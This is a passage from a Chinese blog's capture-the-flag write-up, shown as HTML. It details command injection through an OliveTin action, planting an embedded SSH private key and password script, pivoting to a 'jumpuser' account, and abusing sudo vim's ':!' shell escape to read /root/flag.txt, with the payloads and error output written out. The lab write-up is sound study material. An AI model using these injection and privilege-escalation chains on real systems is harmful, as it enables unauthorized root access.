+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| printf &#x27;%b\n&#x27; &#x27;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCLU0O7w6\nEqtEmfMIvx3JkwAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIAUcgdXePb0Tv90i\nrb8rV/m3zK8BManCZ6/CTlzN0J9fAAAAoGqynJtiiL60/iNV1LnfWw3NGB3taBJwrM81Sr\nPaV7DnxZihYmx3gYkONl+uVQKJ6VVJUh/H+xw1LHVFOdNPvJ0NVAgaLK2a+4kQGZQR96N0\nI17IuSGGqh1i61GHfn0wAnwXLD9qR5+gnDkLThydkrFfzsbP/rjoxuXUTkaevfV2Nsm+Ir\n6UI2TgBuuXTedjm02DIbBB2PIJABHAANP+Vpc=\n-----END OPENSSH PRIVATE KEY-----&#x27; &gt; /tmp/my_key; </span><br><span class="line">chmod 600 /tmp/my_key; </span><br><span class="line">printf &#x27;#!/bin/sh\necho h0GQGA3cRf9Djseg7T\n&#x27; &gt; /tmp/pwd.sh; </span><br><span class="line">chmod +x /tmp/pwd.sh; </span><br><span class="line">SSH_ASKPASS=/tmp/pwd.sh DISPLAY=:0 ssh -o StrictHostKeyChecking=no -p 2222 -i /tmp/my_key jumpuser@127.0.0.1 &quot;id; cat /home/jumpuser/note.txt; sudo -l&quot; &lt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>然后成功转移到jumpuser用户提权</p>
+<p>然后直接读取root里面的flag.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| SSH_ASKPASS=/tmp/pwd.sh DISPLAY=:0 ssh -o StrictHostKeyChecking=no -p 2222 -i /tmp/my_key jumpuser@127.0.0.1 &quot;echo &#x27;:!cat /root/flag.txt &gt; /tmp/rflag&#x27; &gt; /tmp/v.txt; echo &#x27;&#x27; &gt;&gt; /tmp/v.txt; echo &#x27;:q!&#x27; &gt;&gt; /tmp/v.txt; echo &#x27;&#x27; &gt;&gt; /tmp/v.txt; cat /tmp/v.txt | sudo /usr/bin/vim /opt/pentest/maintenance/README.md; cat /tmp/rflag&quot; &lt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现报错信息为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">signal: killed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vim: Warning: Output is not to a terminal</span><br><span class="line"></span><br><span class="line">Vim: Warning: Input is not from a terminal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E558: Terminal entry not found in terminfo</span><br><span class="line"></span><br><span class="line">&#x27;unknown&#x27; not known. Available builtin terminals are:</span><br><span class="line"></span><br><span class="line">    builtin_ansi</span><br><span class="line"></span><br><span class="line">    builtin_xterm</span><br><span class="line"></span><br><span class="line">    builtin_iris-ansi</span><br><span class="line"></span><br><span class="line">    builtin_dumb</span><br><span class="line"></span><br><span class="line">defaulting to &#x27;ansi&#x27;</span><br><span class="line"></span><br><span class="line">OliveTin::timeout - this action timed out after 3 seconds. If you need more me for this action, set a longer timeout. See https://docs.olivetin.app/acti_customization/timeouts.html for more help.</span><br></pre></td></tr></table></figure>
+
+<p>问下ai: ‘’Vim 是一个交互式编辑器。当我们强行用管道 <code>|</code> 把命令喂给它时，它发现没有一个真正的终端（TTY）可以绘图和接收实时键盘输入，于是报了 <code>Warning: Input is not from a terminal</code> 和 <code>E558</code> 终端类型错误。看最后一行 <code>OliveTin::timeout - this action timed out after 3 seconds</code>。由于 Vim 因为没有终端卡在那里等待输入，整个进程悬停了，3秒后被 OliveTin 的安全机制强制杀死’’</p>
+<p>最终payload，加入printf模拟vim写入操作，强制分配 PTY，并且将所有输出重定向到日志文件，并将整个 SSH 进程挂到后台，然后把控制权还给 OliveTin避免超时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| printf &quot;:!cat /root/flag.txt &gt; /tmp/rflag; chmod 777 /tmp/rflag\n\n:q!\n&quot; | SSH_ASKPASS=/tmp/pwd.sh DISPLAY=:0 ssh -tt -o StrictHostKeyChecking=no -p 2222 -i /tmp/my_key jumpuser@127.0.0.1 &quot;TERM=xterm sudo /usr/bin/vim /opt/pentest/maintenance/README.md&quot; &gt; /tmp/vim_attack.log 2&gt;&amp;1 &amp; echo &quot;Attack launched in background! Please wait 2 seconds.&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最后输入<code> | cat /tmp/rflag</code>得到flag</p>
+<p><img src="C:\Users\15292\Desktop\ctf\联想截图_20260419143127.png" alt="联想截图_20260419143127"></p>
+
+    </div>
+
+    
+    
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------到底咯QAQ嘎嘎-------------</div>
+    
+</div>
+      </div>
+    <script src="https://giscus.app/client.js"
+        data-repo="jachinzhang1/jachinzhang1.github.io"
+        data-repo-id="R_kgDONy_q0w"
+        data-category="Announcements"
+        data-category-id="DIC_kwDONy_q084Cmo0P"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/06/01/CTF/CTF%E7%BB%BC%E5%90%88%E7%AC%94%E8%AE%B0/" rel="prev" title="CTF综合笔记">
+      <i class="fa fa-chevron-left"></i> CTF综合笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-circle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">山河辽阔，人间烟火 | 记录生活与思考的碎片</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/js/site-interactions.js"></script>
+<script>
+  (function() {
+    var overlay = document.createElement('div');
+    overlay.className = 'page-transition-overlay';
+    document.body.appendChild(overlay);
+
+    document.addEventListener('click', function(e) {
+      var link = e.target.closest('a');
+      if (!link || !link.href) return;
+      if (link.target === '_blank') return;
+      if (link.host !== window.location.host) return;
+      if (link.getAttribute('download') != null) return;
+      if (link.hash && link.pathname === window.location.pathname) return;
+      if (e.metaKey || e.ctrlKey) return;
+
+      e.preventDefault();
+      document.body.classList.add('page-exiting');
+      setTimeout(function() {
+        window.location = link.href;
+      }, 260);
+    });
+
+    // Keep overlay hidden when navigating back via bfcache.
+    window.addEventListener('pageshow', function(e) {
+      document.body.classList.remove('page-exiting');
+    });
+  })();
+</script>
+
+</body>
+</html>
